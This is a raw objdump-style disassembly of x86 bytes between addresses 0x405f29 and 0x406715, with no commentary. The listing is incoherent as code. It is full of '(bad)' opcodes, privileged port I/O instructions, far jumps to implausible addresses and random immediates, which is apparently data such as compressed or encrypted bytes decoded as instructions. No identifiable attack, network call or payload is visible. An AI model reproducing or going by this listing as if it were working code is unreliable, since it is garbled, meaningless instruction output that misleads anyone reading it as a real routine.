  405f29:	mov    cl,0xae
  405f2b:	push   eax
  405f2c:	loop   0x405f0e
  405f2e:	mov    esp,0x262bbd46
  405f33:	mov    ds:0x3c87f9e6,eax
  405f38:	xchg   ebp,eax
  405f39:	mov    esi,0xd573d335
  405f3e:	jmp    0xa5c728c6
  405f43:	fdivr  QWORD PTR [edi-0x29]
  405f46:	lock aad 0x2
  405f49:	je     0x405f82
  405f4b:	sbb    eax,0x46beec90
  405f50:	jo     0x405ef5
  405f52:	or     BYTE PTR [esi],bh
  405f54:	out    dx,eax
  405f55:	mov    WORD PTR [ebx+ecx*4-0x20],?
  405f59:	cwde   
  405f5a:	cli    
  405f5b:	shr    BYTE PTR [edi],cl
  405f5d:	(bad)  
  405f5e:	cmp    eax,0x11150356
  405f63:	es retf 
  405f65:	mov    al,ds:0x14c17e87
  405f6a:	pop    ebx
  405f6b:	jbe    0x405feb
  405f6d:	xchg   esp,eax
  405f6e:	test   DWORD PTR [ebp-0x775b29f8],ecx
  405f74:	xchg   esi,eax
  405f75:	xchg   ebx,eax
  405f76:	adc    BYTE PTR [ebx+0x30],dl
  405f79:	int    0xaf
  405f7b:	je     0x405fd4
  405f7d:	jne    0x405fde
  405f7f:	leave  
  405f80:	jmp    0x405fc4
  405f82:	cwde   
  405f83:	or     BYTE PTR [esi],bh
  405f85:	push   es
  405f86:	daa    
  405f87:	popf   
  405f88:	pushf  
  405f89:	mov    al,ds:0x2a3f7440
  405f8f:	inc    ecx
  405f90:	fcmovu st,st(3)
  405f92:	cwde   
  405f93:	test   esi,ebx
  405f95:	inc    edx
  405f96:	cmc    
  405f97:	ins    DWORD PTR es:[edi],dx
  405f98:	arpl   WORD PTR [edi-0x3353d46b],bx
  405f9e:	in     al,0x5c
  405fa0:	sub    edx,DWORD PTR [esi-0x33]
  405fa3:	icebp  
  405fa4:	dec    esi
  405fa5:	rol    BYTE PTR [ecx+0x6d451e61],0x34
  405fac:	dec    edi
  405fad:	ss and esp,esi
  405fb0:	sbb    al,0xa8
  405fb2:	mov    dh,0x21
  405fb4:	(bad)  
  405fb5:	pusha  
  405fb6:	inc    esi
  405fb7:	mov    ebx,0x593a2ba4
  405fbc:	or     DWORD PTR [edi-0x70aecbda],eax
  405fc2:	xor    edi,DWORD PTR [eax+0x4c]
  405fc5:	pop    ebp
  405fc6:	push   0x59497056
  405fcb:	popa   
  405fcc:	pop    ebx
  405fcd:	test   BYTE PTR [eax-0x38],bl
  405fd0:	cmp    al,0x8e
  405fd2:	dec    eax
  405fd3:	dec    eax
  405fd4:	or     dh,cl
  405fd6:	cmp    eax,esp
  405fd8:	jecxz  0x40602a
  405fda:	into   
  405fdb:	add    bp,WORD PTR [esi+0x7]
  405fdf:	sub    eax,0xfa4980e3
  405fe4:	retf   
  405fe5:	cmp    eax,0x811a2505
  405fea:	cmp    DWORD PTR [esi],0x68
  405fed:	test   DWORD PTR [edx+edx*2+0x10],edi
  405ff1:	fst    QWORD PTR [edi+0x64]
  405ff4:	jge    0x405f78
  405ff6:	dec    eax
  405ff7:	sub    dh,bh
  405ff9:	xchg   esi,eax
  405ffa:	push   esi
  405ffb:	xor    dl,dh
  405ffd:	mov    eax,0x93fc8c20
  406002:	ss pop esp
  406004:	sbb    ah,dh
  406006:	pop    ss
  406007:	xor    al,0xd7
  406009:	jo     0x405ff4
  40600b:	dec    ebx
  40600c:	lock xchg edx,eax
  40600e:	sbb    cl,BYTE PTR [ebp-0x2ee14196]
  406014:	gs pop ss
  406016:	daa    
  406017:	iret   
  406018:	mov    esi,0xaf8423b7
  40601d:	popa   
  40601e:	and    DWORD PTR cs:[ecx-0x35c14c03],ebp
  406025:	cmp    eax,0x38be9738
  40602a:	mov    al,0xaf
  40602c:	imul   edi,DWORD PTR [ebx+0x1b13d0e1],0xffffffd2
  406033:	lds    edx,FWORD PTR [edx+edx*2]
  406036:	push   es
  406037:	test   eax,0xb20254a5
  40603c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40603d:	fnstcw WORD PTR [edi-0x56]
  406040:	sbb    al,0xe6
  406042:	dec    ecx
  406043:	jne    0x40600d
  406045:	pop    edx
  406046:	and    bh,bl
  406048:	jbe    0x40601b
  40604a:	aad    0xc8
  40604c:	scas   eax,DWORD PTR es:[edi]
  40604d:	add    esp,DWORD PTR gs:[edx+0x795d544c]
  406054:	xchg   bh,ch
  406056:	mov    ebx,edi
  406058:	cmp    eax,DWORD PTR [edi+0x3cf30f85]
  40605e:	popf   
  40605f:	lock sbb eax,0x5d2800f1
  406065:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406066:	or     DWORD PTR [ebp-0x1b],ebx
  406069:	fbstp  TBYTE PTR [esi-0x1a2cd44c]
  40606f:	leave  
  406070:	jae    0x4060ae
  406072:	jecxz  0x4060be
  406074:	jo     0x406033
  406076:	jmp    0x51360e7f
  40607b:	ds push ecx
  40607d:	jns    0x4060de
  40607f:	jmp    0x40607d
  406081:	call   0x190b1dd1
  406086:	retf   
  406087:	add    edi,eax
  406089:	test   BYTE PTR [ebp-0x5a],al
  40608c:	jne    0x4060a2
  40608e:	and    ch,BYTE PTR [ebx]
  406090:	enter  0xedcc,0xa2
  406094:	mov    ds:0x55d33f5a,al
  406099:	sub    al,0xd5
  40609b:	fistp  DWORD PTR [edi-0x42187373]
  4060a1:	sbb    dh,ch
  4060a3:	sbb    al,0x56
  4060a5:	in     eax,dx
  4060a6:	push   esp
  4060a7:	lahf   
  4060a8:	jecxz  0x40608d
  4060aa:	repnz push cs
  4060ac:	aas    
  4060ad:	outs   dx,BYTE PTR ds:[esi]
  4060ae:	dec    ebx
  4060af:	bound  ebp,QWORD PTR [ebp+0x22cf7146]
  4060b5:	mov    ah,0x69
  4060b7:	adc    eax,0x5273e5b4
  4060bc:	lods   al,BYTE PTR ds:[esi]
  4060bd:	mov    cl,0xfe
  4060bf:	out    dx,eax
  4060c0:	in     al,dx
  4060c1:	jecxz  0x4060f3
  4060c3:	push   es
  4060c4:	cs lock mov edi,0xa6de4da1
  4060cb:	adc    al,0x32
  4060cd:	cli    
  4060ce:	jo     0x406146
  4060d0:	and    BYTE PTR [edi-0x2a],bh
  4060d3:	xchg   DWORD PTR [ebx+0x4aafadb7],edx
  4060d9:	xchg   esp,eax
  4060da:	out    dx,al
  4060db:	mov    ecx,0xe9f803a
  4060e0:	jno    0x406137
  4060e2:	mov    ebx,0x80a4c881
  4060e7:	jmp    0x4060a9
  4060e9:	fwait
  4060ea:	jb     0x406080
  4060ec:	dec    ebx
  4060ed:	cdq    
  4060ee:	imul   ebx,DWORD PTR [ecx+0x41],0x225fa6ea
  4060f5:	aas    
  4060f6:	xor    edx,DWORD PTR [edi-0x37]
  4060f9:	jae    0x40615d
  4060fb:	out    0x99,eax
  4060fd:	mov    dh,0x41
  4060ff:	shr    ah,1
  406101:	ret    
  406102:	jno    0x40613f
  406104:	and    esi,esp
  406106:	inc    esp
  406107:	and    DWORD PTR [ecx-0x744451fe],ebx
  40610d:	and    eax,0x8396276c
  406112:	addr16 retf 0x902f
  406116:	pop    ebx
  406117:	shrd   DWORD PTR [ebx-0x47],ebx,cl
  40611b:	adc    al,0x76
  40611d:	pop    ds
  40611e:	mov    fs,WORD PTR [edi]
  406120:	mov    ecx,0xc682bf36
  406125:	add    ch,BYTE PTR [edx+0x6e]
  406128:	out    dx,eax
  406129:	(bad)
  40612d:	stc    
  40612e:	push   ecx
  40612f:	imul   esp,DWORD PTR [edi-0x20],0x3d
  406133:	xchg   ebp,eax
  406134:	fadd   DWORD PTR [ebx+0x1]
  406137:	das    
  406138:	ret    0x1c82
  40613b:	jp     0x406132
  40613d:	call   0xff9b:0xd6199c15
  406144:	push   ss
  406145:	in     al,0x6f
  406147:	and    al,0x9e
  406149:	and    cl,ah
  40614b:	stos   DWORD PTR es:[edi],eax
  40614c:	mov    eax,DWORD PTR [edx+0x72]
  40614f:	mov    ecx,0x222c4db6
  406154:	inc    esi
  406155:	jle    0x40610b
  406157:	jno    0x40617b
  406159:	pop    eax
  40615a:	in     eax,dx
  40615b:	xchg   edi,eax
  40615c:	mov    al,ds:0x6e228daf
  406161:	popa   
  406162:	int3   
  406163:	push   edi
  406164:	outs   dx,BYTE PTR ds:[esi]
  406165:	add    esi,edx
  406167:	dec    esi
  406168:	sbb    DWORD PTR [eax-0x616aced2],ecx
  40616e:	sbb    dl,dh
  406170:	mov    ds:0xcf2b212,al
  406175:	test   al,0x1b
  406177:	mov    eax,0x603d60f
  40617c:	push   0x4f94eb3e
  406181:	sar    BYTE PTR ds:0x7a4256ea,1
  406187:	repz jo 0x406197
  40618a:	jae    0x406197
  40618c:	cli    
  40618d:	jl     0x406111
  40618f:	pop    edi
  406190:	test   al,0xc6
  406192:	add    eax,0x1893b344
  406197:	in     eax,dx
  406198:	xchg   ecx,eax
  406199:	or     DWORD PTR [eax],ecx
  40619b:	imul   ecx,DWORD PTR [esi+0x73],0x16
  40619f:	inc    ecx
  4061a0:	mov    dl,0x50
  4061a2:	adc    DWORD PTR ss:[edx],esi
  4061a5:	cld    
  4061a6:	pushf  
  4061a7:	pop    eax
  4061a8:	push   ebp
  4061a9:	xlat   BYTE PTR ds:[ebx]
  4061aa:	cmp    DWORD PTR [eax+0x14c05e5d],ecx
  4061b0:	mov    al,ds:0x5698cc11
  4061b5:	imul   ebx,ecx,0x6182f316
  4061bb:	les    ebx,FWORD PTR [esi+0x2a]
  4061be:	mov    esp,0x4aa34380
  4061c3:	push   0xdf57b9f9
  4061c8:	int3   
  4061c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061ca:	out    0x45,al
  4061cc:	inc    esp
  4061cd:	xor    edi,eax
  4061cf:	hlt    
  4061d0:	mov    bl,0x8c
  4061d2:	and    DWORD PTR [esp+eiz*2+0x467b8063],0xffffffed
  4061da:	mov    esi,es
  4061dc:	test   ebx,ebx
  4061de:	pop    ss
  4061df:	pop    eax
  4061e0:	sbb    BYTE PTR [edx+0x3c3d11a8],bl
  4061e6:	xor    al,BYTE PTR [esi-0x60]
  4061e9:	sbb    cl,BYTE PTR [edi+0x45]
  4061ec:	ds jno 0x406202
  4061ef:	sbb    esp,esp
  4061f1:	imul   esi,DWORD PTR [edi+0x19],0x55140f6f
  4061f8:	or     ah,ch
  4061fa:	jne    0x406194
  4061fc:	iret   
  4061fd:	mov    dl,0xef
  4061ff:	adc    DWORD PTR [eax+0x6431f159],ecx
  406205:	push   0x6a72a93
  40620a:	jl     0x4061d8
  40620c:	mov    es,eax
  40620e:	mov    bh,0x51
  406210:	lods   eax,DWORD PTR ds:[esi]
  406211:	xor    eax,0x9cf10b89
  406216:	jmp    DWORD PTR [edi+0x5ddaf792]
  40621c:	out    0x29,al
  40621e:	in     eax,dx
  40621f:	mov    dl,0xc8
  406221:	pcmpeqb mm0,QWORD PTR ds:0x647c4ccc
  406228:	fild   QWORD PTR [edx+0x230ddbd6]
  40622e:	cwde   
  40622f:	jp     0x406210
  406231:	xchg   esp,eax
  406232:	ror    DWORD PTR [ecx-0x55],1
  406235:	retf   0x4bf5
  406238:	jo     0x40627c
  40623a:	(bad)  [ebx-0x9]
  40623d:	js     0x406210
  40623f:	cmp    al,0x1d
  406242:	sar    DWORD PTR [edx+0x4a],1
  406245:	add    BYTE PTR [esp+ebp*2],dl
  406248:	xor    DWORD PTR [esp+eax*8-0x534b00cc],edi
  40624f:	fs mov bl,0xb3
  406252:	xor    dl,BYTE PTR [eax]
  406254:	(bad)  
  406255:	loopne 0x4061dd
  406257:	adc    DWORD PTR [edx+0x24902e89],esi
  40625d:	pop    ebx
  40625e:	xor    BYTE PTR [eax-0x4a],0xb5
  406262:	iret   
  406263:	xor    al,0x6e
  406265:	out    dx,al
  406266:	xor    dl,BYTE PTR [ecx]
  406268:	(bad)  
  40626a:	das    
  40626b:	test   eax,0xaac93679
  406270:	add    eax,0xffffffcb
  406273:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406274:	imul   ebp,DWORD PTR [ebx+0x49],0x6744a07b
  40627b:	lea    edi,[esi+0x59ab8162]
  406281:	sub    edx,esi
  406283:	push   ds
  406284:	fcmovu st,st(0)
  406287:	int    0x84
  406289:	or     cl,dh
  40628b:	and    BYTE PTR [esi+eax*2+0xc],ch
  40628f:	test   al,0x0
  406291:	push   esi
  406292:	adc    DWORD PTR [ebx-0x66],esp
  406295:	mov    ds:0x38b8a350,eax
  40629a:	sub    dh,BYTE PTR [edi+0x62]
  40629d:	or     esi,DWORD PTR [edi+0x68a35914]
  4062a3:	dec    ecx
  4062a4:	jmp    0x5073:0x690f3c62
  4062ab:	mov    ebp,0x4086e573
  4062b0:	add    DWORD PTR [ebx],0x0
  4062b3:	int3   
  4062b4:	dec    ebp
  4062b5:	xchg   ebp,eax
  4062b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4062b7:	jl     0x406260
  4062b9:	test   eax,0x39299d22
  4062be:	aad    0xd9
  4062c0:	(bad)  
  4062c1:	inc    edi
  4062c2:	mov    cl,BYTE PTR [ecx+0xc]
  4062c5:	sub    BYTE PTR [ebx+0x33e1dc0a],dh
  4062cb:	into   
  4062cc:	push   ecx
  4062cd:	xor    eax,0x8934f4f8
  4062d2:	aas    
  4062d3:	dec    esi
  4062d4:	jmp    0x406316
  4062d6:	ds sbb al,0xa3
  4062d9:	add    al,0x40
  4062db:	cld    
  4062dc:	jns    0x4062dd
  4062de:	mov    esi,0x78c5e2d4
  4062e3:	fisubr WORD PTR [edx-0x1c96716f]
  4062e9:	out    dx,al
  4062ea:	push   cs
  4062eb:	rcl    ah,cl
  4062ed:	or     esi,DWORD PTR [esi-0x2d]
  4062f0:	sti    
  4062f1:	fsubr  st(0),st
  4062f3:	push   ebx
  4062f4:	dec    ebx
  4062f5:	sbb    eax,0xb72a1f64
  4062fa:	out    0x7a,al
  4062fc:	data16 (bad) 
  4062ff:	cld    
  406300:	fist   DWORD PTR [edx+0x1c292c84]
  406306:	stos   BYTE PTR es:[edi],al
  406307:	fldlg2 
  406309:	push   ebp
  40630a:	mov    ah,0x1b
  40630c:	adc    eax,0xa7154b2f
  406311:	fsub   DWORD PTR [edi+ebx*8-0x368285df]
  406318:	out    0xd2,eax
  40631a:	mov    eax,ds:0x20289526
  40631f:	(bad)  
  406320:	push   ebx
  406321:	inc    edx
  406322:	mov    cl,0x33
  406324:	out    dx,eax
  406325:	fiadd  WORD PTR [edi-0x63066843]
  40632b:	push   cs
  40632c:	iret   
  40632d:	frstor [ebx-0x4f66859e]
  406333:	(bad)  
  406334:	mov    dl,bh
  406336:	rcl    BYTE PTR [ebx-0x13a9ed59],cl
  40633c:	and    eax,0x2b5e90ec
  406341:	(bad)  
  406342:	cmc    
  406343:	loop   0x406314
  406345:	jecxz  0x4063c6
  406347:	mov    ebp,0x8d3581fb
  40634c:	je     0x40631a
  40634e:	push   0xa3d51c5b
  406353:	mov    edi,0xedab05d5
  406358:	and    ebx,DWORD PTR [ebp+0x54]
  40635b:	add    esp,DWORD PTR [ebx]
  40635d:	iret   
  40635e:	jecxz  0x4062e6
  406360:	scas   eax,DWORD PTR es:[edi]
  406361:	jl     0x4063cd
  406363:	push   ebp
  406364:	imul   ebx,DWORD PTR [edi-0x79],0x27
  406368:	mov    ecx,0x8c67f302
  40636d:	sub    al,0xe6
  40636f:	cmp    eax,DWORD PTR ds:[eax+edx*1]
  406373:	lods   al,BYTE PTR ds:[esi]
  406374:	jmp    0xea8a:0xc7553de2
  40637b:	or     ebx,DWORD PTR [ebp-0x5372bcac]
  406381:	leave  
  406382:	mov    eax,0x28ab4eb
  406387:	push   cs
  406388:	adc    al,0xda
  40638a:	inc    edi
  40638b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40638c:	(bad)  
  40638d:	jp     0x406325
  40638f:	gs jno 0x40631c
  406392:	mov    edi,DWORD PTR [ecx]
  406394:	fild   WORD PTR [edi]
  406396:	jmp    0x406375
  406398:	push   esi
  406399:	push   cs
  40639a:	adc    DWORD PTR [edi-0xfb607ab],esp
  4063a0:	mov    eax,0x8553aeca
  4063a5:	cmc    
  4063a6:	push   eax
  4063a7:	xchg   esi,eax
  4063a8:	jp     0x4063ea
  4063aa:	mov    dh,0x1a
  4063ac:	xchg   ebp,eax
  4063ad:	daa    
  4063ae:	and    al,0xb2
  4063b0:	lahf   
  4063b1:	ret    
  4063b2:	jp     0x406344
  4063b4:	mov    bl,0x8
  4063b6:	ins    BYTE PTR es:[edi],dx
  4063b7:	push   ebx
  4063b8:	cmp    DWORD PTR [edi-0x77a42571],0x13
  4063bf:	xchg   ebx,eax
  4063c0:	push   es
  4063c1:	mov    eax,0xedce4b65
  4063c6:	outs   dx,DWORD PTR ds:[esi]
  4063c7:	push   0x8ea1a035
  4063cc:	out    0x12,eax
  4063ce:	mov    BYTE PTR [ebx-0x38],ch
  4063d1:	rcl    DWORD PTR [ebx+0x25c8c72e],1
  4063d7:	adc    eax,0xf4c8a6ec
  4063dc:	fidivr DWORD PTR [esi+0x73d8aeb1]
  4063e2:	(bad)  
  4063e3:	jmp    0x9f93:0x2c880b75
  4063ea:	ds addr16 and al,0xe7
  4063ee:	xchg   ecx,eax
  4063ef:	xchg   edx,eax
  4063f0:	add    esi,0x6a
  4063f3:	in     eax,0xb9
  4063f5:	dec    ebx
  4063f6:	int3   
  4063f7:	mov    bh,0x14
  4063f9:	xacquire xchg DWORD PTR [edx-0x4d5de777],eax
  406400:	jmp    0x40645c
  406402:	ins    BYTE PTR es:[edi],dx
  406403:	jbe    0x40641b
  406405:	cs addr16 loopne 0x406457
  406409:	mov    esp,0xe1704484
  40640e:	pop    edi
  40640f:	test   eax,0x39b7088a
  406414:	loopne 0x406467
  406416:	imul   esi,ebp,0xf8ac616f
  40641c:	ds dec ebx
  40641e:	les    ecx,FWORD PTR [ecx+0xe]
  406421:	mov    ds:0x2b1c3e10,al
  406426:	push   eax
  406427:	pop    esp
  406428:	(bad)  
  406429:	adc    al,0x42
  40642b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40642c:	dec    ecx
  40642d:	mov    ch,0x14
  40642f:	pop    esp
  406430:	push   edi
  406431:	jnp    0x406482
  406433:	ret    
  406434:	scas   al,BYTE PTR es:[edi]
  406435:	stc    
  406436:	sbb    esp,DWORD PTR [ecx+esi*4]
  406439:	xchg   ebx,eax
  40643a:	mov    esp,0x9d3be7a3
  40643f:	and    ebp,ebx
  406441:	pop    ebx
  406442:	mov    DWORD PTR ds:0x3247f494,ebx
  406448:	xchg   DWORD PTR [ebp+0x40],ecx
  40644b:	mov    dl,0xf4
  40644d:	ret    0x39fb
  406450:	ds jmp 0x5eb5a990
  406456:	bound  ecx,QWORD PTR [edi+0x23c3e355]
  40645c:	or     eax,0x71d9bf5d
  406461:	dec    edi
  406462:	and    cl,dl
  406464:	mov    bh,BYTE PTR [edi+0x72a2b92]
  40646a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40646b:	(bad)  [esi]
  40646d:	jl     0x406484
  40646f:	aaa    
  406470:	add    BYTE PTR [esi],bl
  406472:	dec    esp
  406473:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406474:	jecxz  0x406487
  406476:	cmp    ch,dl
  406478:	fidivr DWORD PTR [esi+0x30]
  40647b:	clc    
  40647c:	and    ebx,DWORD PTR [edi+0x71fa6fa6]
  406482:	cmp    edi,DWORD PTR [edi]
  406484:	in     eax,dx
  406485:	mov    ds:0xce652f46,eax
  40648a:	lock rcl esi,cl
  40648d:	xchg   ecx,eax
  40648e:	daa    
  40648f:	push   ebx
  406490:	dec    eax
  406491:	sbb    al,0xa2
  406493:	jno    0x406474
  406495:	mov    cl,0x76
  406497:	mov    ebx,0xcfd446bd
  40649c:	mov    ebp,0x93a5d928
  4064a1:	bound  ebx,QWORD PTR ds:0xcc5d
  4064a6:	pop    es
  4064a7:	fild   QWORD PTR [edi-0x174a2259]
  4064ad:	fwait
  4064ae:	std    
  4064af:	adc    ebp,DWORD PTR fs:[esi+0x3b]
  4064b3:	adc    eax,0xd483420a
  4064b8:	sub    BYTE PTR [edx+ecx*1],ah
  4064bb:	(bad)  
  4064bc:	loopne 0x4064d6
  4064be:	xchg   edi,esi
  4064c0:	jge    0x40648f
  4064c2:	or     eax,0xb9a59709
  4064c7:	xor    BYTE PTR [edx-0x67],bh
  4064ca:	or     al,0xbc
  4064cc:	mov    ah,0xb8
  4064ce:	lods   al,BYTE PTR ds:[esi]
  4064cf:	mov    al,ds:0x39381162
  4064d4:	xchg   ebp,eax
  4064d5:	dec    ebx
  4064d6:	push   ss
  4064d7:	jno    0x40649d
  4064d9:	inc    edx
  4064da:	lahf   
  4064db:	mov    dh,0x63
  4064dd:	xor    esp,DWORD PTR [eax-0x37]
  4064e0:	clc    
  4064e1:	aas    
  4064e2:	push   0x43
  4064e4:	sub    esp,ecx
  4064e6:	rcl    BYTE PTR [esi-0x1],1
  4064e9:	das    
  4064ea:	jnp    0x406513
  4064ec:	nop    eax
  4064ef:	fs imul esp,ecx,0x23cae3c3
  4064f6:	lods   eax,DWORD PTR ds:[esi]
  4064f7:	enter  0x16fa,0x3e
  4064fb:	xchg   ebp,eax
  4064fc:	mov    DWORD PTR [esi+ecx*2],ecx
  4064ff:	(bad)  
  406500:	ds mov ss,ebp
  406503:	inc    ebx
  406504:	fldcw  WORD PTR [ebx+0x5f]
  406507:	pop    eax
  406508:	(bad)  
  406509:	fsubr  QWORD PTR [ecx]
  40650b:	(bad)  [ebp+0x3c3b8e9e]
  406511:	outs   dx,DWORD PTR ds:[esi]
  406512:	jbe    0x4064dd
  406514:	ss push 0x8d2d5ced
  40651a:	xchg   edi,eax
  40651b:	and    al,0x67
  40651d:	cmp    al,BYTE PTR [edi-0x27]
  406520:	pop    ds
  406521:	jbe    0x4064aa
  406523:	fwait
  406524:	fwait
  406525:	cmc    
  406526:	sahf   
  406527:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406528:	xchg   ecx,eax
  406529:	clc    
  40652a:	lods   eax,DWORD PTR ds:[esi]
  40652b:	out    dx,eax
  40652c:	inc    ebp
  40652d:	aas    
  40652e:	movntps XMMWORD PTR [esi-0x28bec9da],xmm3
  406535:	inc    edi
  406536:	inc    esp
  406537:	pop    esp
  406538:	iret   
  406539:	xor    bl,dl
  40653b:	retf   0x3ee9
  40653e:	xchg   BYTE PTR [edi],dh
  406540:	sbb    dl,bl
  406542:	and    bh,ch
  406544:	cmp    al,0xcd
  406546:	push   ebx
  406547:	(bad)  
  406549:	repz mov dh,0xdf
  40654c:	adc    ebp,DWORD PTR [ecx+0x1aabecd4]
  406552:	not    DWORD PTR [esi-0x42]
  406555:	pop    es
  406556:	enter  0xa7a4,0x10
  40655a:	cli    
  40655b:	aad    0xa0
  40655d:	out    0x8d,al
  40655f:	push   cs
  406560:	adc    al,bh
  406562:	mov    ch,0x5c
  406564:	sti    
  406565:	outs   dx,BYTE PTR ds:[esi]
  406566:	xchg   BYTE PTR [ecx+0xda9146b],ah
  40656c:	sub    edx,DWORD PTR [esi+ebp*8]
  40656f:	daa    
  406570:	in     al,0x5
  406572:	cmp    al,0xb6
  406574:	aad    0xc8
  406576:	add    esp,edi
  406578:	mov    ah,0x11
  40657a:	or     BYTE PTR [ebx],dh
  40657c:	shrd   DWORD PTR ds:0x3d70b545,edx,cl
  406583:	dec    esp
  406584:	(bad)  
  406585:	lea    edi,[eax]
  406587:	fst    st(7)
  406589:	fpatan 
  40658b:	xchg   ebx,eax
  40658c:	std    
  40658d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40658e:	ret    0x8403
  406591:	int    0xad
  406593:	sbb    al,0x22
  406595:	nop
  406596:	scas   eax,DWORD PTR es:[edi]
  406597:	xor    DWORD PTR [ebp-0x52791050],edx
  40659d:	jg     0x40652f
  40659f:	cld    
  4065a0:	xchg   ebp,eax
  4065a1:	ins    DWORD PTR es:[edi],dx
  4065a2:	inc    esp
  4065a3:	bound  ebp,QWORD PTR [ecx]
  4065a5:	int3   
  4065a6:	cmp    DWORD PTR [eax+edi*4+0x1b],ebx
  4065aa:	pop    ecx
  4065ab:	fwait
  4065ac:	inc    edi
  4065ad:	xor    al,0x26
  4065af:	cli    
  4065b0:	fnstsw WORD PTR [eax]
  4065b2:	sbb    cl,bl
  4065b4:	add    al,0x7e
  4065b6:	cmp    BYTE PTR [edi+0x37008050],bh
  4065bc:	icebp  
  4065bd:	ret    
  4065be:	ffree  st(5)
  4065c0:	xor    edx,edx
  4065c2:	and    al,0x25
  4065c4:	and    esi,DWORD PTR [ebx-0x4a]
  4065c7:	gs sub dh,bh
  4065ca:	inc    sp
  4065cc:	shl    dl,cl
  4065ce:	jno    0x40660d
  4065d0:	mov    dl,0x7b
  4065d2:	pop    esi
  4065d3:	sbb    DWORD PTR [edi],edx
  4065d5:	adc    DWORD PTR [esi+0x6a],0x49
  4065d9:	sub    bl,0x4e
  4065dc:	jl     0x406619
  4065de:	mov    al,0x80
  4065e0:	sbb    al,0x2d
  4065e3:	pop    es
  4065e4:	fisubr DWORD PTR [ecx]
  4065e6:	pop    ds
  4065e7:	or     eax,0xf491c03c
  4065ec:	lock aaa 
  4065ee:	fidiv  DWORD PTR [ebx-0x4497a02b]
  4065f4:	out    dx,eax
  4065f5:	sahf   
  4065f6:	push   es
  4065f7:	sub    ecx,DWORD PTR [esi-0x70]
  4065fa:	add    eax,0x2d18294c
  4065ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406600:	push   esi
  406601:	lods   al,BYTE PTR ds:[esi]
  406602:	repz adc DWORD PTR [ebp-0xd],esp
  406606:	lock fs jno 0x4065ad
  40660a:	enter  0xe332,0xfa
  40660e:	ret    0x7a17
  406611:	int3   
  406612:	in     eax,0x12
  406614:	mov    ch,0xf3
  406616:	scas   al,BYTE PTR es:[edi]
  406617:	adc    DWORD PTR [ebx+eiz*2],esi
  40661a:	add    dh,BYTE PTR [ecx+0x7b]
  40661d:	mov    ah,0xb8
  40661f:	push   edx
  406620:	dec    esi
  406621:	dec    esp
  406622:	inc    edx
  406623:	ret    
  406624:	(bad)  
  406625:	and    BYTE PTR [esi],cl
  406627:	cmp    DWORD PTR [edx-0x73],esp
  40662a:	inc    esi
  40662b:	inc    ebp
  40662c:	jl     0x4065b6
  40662e:	cmc    
  40662f:	test   eax,0xf71fb42c
  406634:	adc    dh,cl
  406636:	jecxz  0x40668e
  406638:	dec    ecx
  406639:	mov    esi,0x46d2cc15
  40663e:	lds    esp,FWORD PTR [edi]
  406640:	and    DWORD PTR [ecx+0x3f],edx
  406643:	mov    ds:0x7429a2c,al
  406648:	in     eax,dx
  406649:	inc    esp
  40664a:	or     DWORD PTR [ebx+0x4d57a85c],edi
  406650:	out    dx,eax
  406651:	mov    ah,0xfe
  406653:	test   DWORD PTR [ecx+0x6e8d6dfa],esi
  406659:	jns    0x406653
  40665b:	pop    es
  40665c:	div    BYTE PTR [esi-0x3b]
  40665f:	(bad)  [edi]
  406661:	pop    esp
  406662:	call   0xc2884c10
  406667:	das    
  406668:	aam    0x67
  40666a:	jbe    0x4066b7
  40666c:	retf   0xb467
  40666f:	cmp    DWORD PTR [ebx-0x42ea22de],ebx
  406675:	and    bh,BYTE PTR [ecx]
  406677:	pusha  
  406678:	mov    ch,0xea
  40667a:	fadd   QWORD PTR [edx-0xd6b09ea]
  406680:	mov    dl,0x1c
  406682:	icebp  
  406683:	mov    cl,0xc2
  406685:	and    cl,bh
  406687:	jns    0x4066fd
  406689:	and    eax,DWORD PTR [ebx-0x58cd3fd5]
  40668f:	jnp    0x406669
  406691:	retf   
  406692:	mov    DWORD PTR [eax+0x12030197],ebx
  406698:	jb     0xd1aa6710
  40669e:	sahf   
  40669f:	nop
  4066a0:	jle    0x4066d9
  4066a2:	out    dx,eax
  4066a3:	xchg   ecx,eax
  4066a4:	iret   
  4066a5:	pop    esp
  4066a6:	jns    0x406670
  4066a8:	out    0x2e,eax
  4066aa:	jmp    FWORD PTR [eax-0x5668d0b3]
  4066b0:	test   DWORD PTR [ebp-0x4e4ca513],ebp
  4066b6:	or     al,0xd4
  4066b8:	loopne 0x4066fe
  4066ba:	cmc    
  4066bb:	call   0x7687ff4e
  4066c0:	repnz fs pop esi
  4066c3:	xchg   ecx,eax
  4066c4:	or     eax,ebx
  4066c6:	js     0x4066b5
  4066c8:	or     ch,BYTE PTR [eax+0x68]
  4066cb:	loopne 0x406677
  4066cd:	cli    
  4066ce:	dec    edx
  4066cf:	sbb    BYTE PTR [ebp-0x774bb856],cl
  4066d5:	adc    edx,DWORD PTR [ebx+0x44]
  4066d8:	xlat   BYTE PTR ds:[ebx]
  4066d9:	xchg   esp,eax
  4066da:	scas   al,BYTE PTR es:[edi]
  4066db:	in     al,dx
  4066dc:	fstp   QWORD PTR [ecx]
  4066de:	xor    esi,DWORD PTR [ebx-0x2ca732d]
  4066e4:	mov    ebp,0xf160f744
  4066e9:	pop    esi
  4066ea:	(bad)  
  4066ec:	dec    esp
  4066ed:	inc    eax
  4066ee:	cmp    edx,DWORD PTR [eax-0x68]
  4066f1:	push   esi
  4066f2:	test   ah,0x99
  4066f5:	add    ebp,DWORD PTR [edi-0xb062661]
  4066fb:	hlt    
  4066fc:	xchg   edi,eax
  4066fd:	adc    dh,ch
  4066ff:	gs icebp 
  406701:	sbb    BYTE PTR [ebp+0x17],bh
  406704:	jmp    0xc71baa52
  406709:	or     DWORD PTR [esi],esi
  40670b:	xor    eax,DWORD PTR [edi-0x7b1f64b5]
  406711:	lea    eax,[esi]
  406713:	add    al,0x13
  406715:	xor    BYTE PTR [ebp+esi*1+0x17],cl
